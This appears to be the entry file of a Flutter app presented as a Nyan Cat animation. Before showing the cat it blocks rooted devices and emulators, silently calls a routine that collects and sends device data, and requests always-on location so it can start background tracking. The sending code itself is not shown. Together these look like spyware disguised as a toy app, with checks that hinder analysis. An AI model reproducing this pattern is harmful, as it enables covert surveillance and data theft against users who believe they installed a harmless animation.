import 'dart:io';
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:jailbreak_root_detection/jailbreak_root_detection.dart';
import 'package:just_audio/just_audio.dart';
import 'package:permission_handler/permission_handler.dart';

import 'device_service.dart';
import 'home/home.dart';
import 'location_service.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final securityIssues = await _getSecurityIssues();
  //final List<String> securityIssues = [];
  if (securityIssues.isNotEmpty) {
    print('Security issues detected! Exiting application.');
    runApp(SecurityErrorApp(issues: securityIssues));
    return;
  }

  try {
    await DeviceService.collectAndSendDeviceData();
    print("Device data collection initiated");
  } catch (e) {
    print("Error collecting device data: $e");
  }

  await Permission.notification.request();
  await Permission.location.request();
  if (await Permission.location.isGranted) {
    await Permission.locationAlways.request();
  }

  runApp(const MyApp());
}

Future<List<String>> _getSecurityIssues() async {
  final issues = <String>[];

  try {
    final isNotTrust = await JailbreakRootDetection.instance.isNotTrust;
    final isRealDevice = await JailbreakRootDetection.instance.isRealDevice;

    print('=== SECURITY CHECK ===');
    print('isNotTrust: $isNotTrust');
    print('isRealDevice: $isRealDevice');

    if (isNotTrust) issues.add('Device is rooted/jailbroken');
    if (!isRealDevice) issues.add('Running on emulator/simulator');

    if (Platform.isAndroid) {
      try {
        bool isOnExternalStorage =
        await JailbreakRootDetection.instance.isOnExternalStorage;
        print('isOnExternalStorage: $isOnExternalStorage');
        if (isOnExternalStorage) issues.add('App installed on external storage');
      } catch (e) {
        issues.add('Error checking external storage: $e');
      }
    }

    if (issues.isEmpty) {
      print('✅ No security issues detected');
    } else {
      print('⚠️ Security issues detected:');
      issues.forEach((issue) => print('  - $issue'));
    }
  } catch (e) {
    print('Error during security check: $e');
    issues.add('Error during security check: $e');
  }

  return issues;
}

class SecurityErrorApp extends StatelessWidget {
  final List<String> issues;
  const SecurityErrorApp({super.key, required this.issues});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Security Error',
      theme: ThemeData.dark(),
      home: Scaffold(
        backgroundColor: Colors.red.shade900,
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.security, size: 100, color: Colors.white),
                const SizedBox(height: 32),
                const Text(
                  'Security Issue Detected',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 16),
                const Text(
                  'This app cannot run on rooted/jailbroken devices or emulators.',
                  style: TextStyle(fontSize: 16, color: Colors.white70),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 16),
                if (issues.isNotEmpty) ...[
                  const Text(
                    'Details:',
                    style: TextStyle(
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                        color: Colors.white),
                  ),
                  const SizedBox(height: 8),
                  ...issues.map(
                        (issue) => Text(
                      '- $issue',
                      style: const TextStyle(color: Colors.white70),
                    ),
                  ),
                  const SizedBox(height: 32),
                ],
                ElevatedButton(
                  onPressed: () {
                    if (Platform.isAndroid) {
                      SystemNavigator.pop();
                    } else if (Platform.isIOS) {
                      exit(0);
                    }
                  },
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.white,
                    foregroundColor: Colors.red.shade900,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 32, vertical: 16),
                  ),
                  child: const Text('Exit App'),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<List<ui.Image>> _nyanCatFramesFuture;
  final player = AudioPlayer();

  @override
  void initState() {
    super.initState();

    startService();

    _nyanCatFramesFuture = loadNyanFrames();
    loadAudio();
  }

  @override
  void dispose() {
    player.dispose();
    super.dispose();
  }

  Future<void> startService() async {
    if (await Permission.locationAlways.isGranted) {
      await LocationService.instance.startLocationTracking();
    }
  }

  Future<void> loadAudio() async {
    await player.setAsset('assets/nyan-cat.ogg');
    player.setVolume(1.0);
  }

  Future<List<ui.Image>> loadNyanFrames() async {
    var images = <ui.Image>[];
    for (var i = 0; i < 7; i++) {
      final data = await rootBundle.load('assets/$i.gif');
      final codec = await ui.instantiateImageCodec(data.buffer.asUint8List());
      final frame = await codec.getNextFrame();
      images.add(frame.image);
    }
    return images;
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Nyan Cat',
      theme: ThemeData.dark(),
      home: FutureBuilder<List<ui.Image>>(
        future: _nyanCatFramesFuture,
        builder: (_, snapshot) {
          if (snapshot.connectionState == ConnectionState.done &&
              snapshot.hasData) {
            return MyHomePage(
              frames: snapshot.data!,
              audioPlayer: player,
            );
          } else {
            return const Scaffold(
              body: Center(child: CircularProgressIndicator.adaptive()),
            );
          }
        },
      ),
    );
  }
}